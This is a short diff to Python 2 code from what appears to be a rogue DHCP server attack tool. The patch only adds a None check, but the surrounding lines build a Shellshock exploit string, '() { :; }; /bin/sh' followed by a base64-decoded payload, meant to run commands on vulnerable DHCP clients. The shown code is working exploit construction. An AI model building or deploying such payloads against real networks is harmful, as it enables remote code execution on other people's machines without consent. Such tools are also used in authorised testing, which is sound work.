@@ -306,9 +306,10 @@ def dhcp_reply(request):
                         payload = b64encode(payload)
                         shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
 
-                if len(shellshock_url) > 255:
-                    print "[ERROR] Len of command is very big! Current len: " + str(len(shellshock_url))
-                    shellshock_url = "A"
+                if shellshock_url is not None:
+                    if len(shellshock_url) > 255:
+                        print "[ERROR] Len of command is very big! Current len: " + str(len(shellshock_url))
+                        shellshock_url = "A"
 
                 global proxy
                 if args.proxy is None:
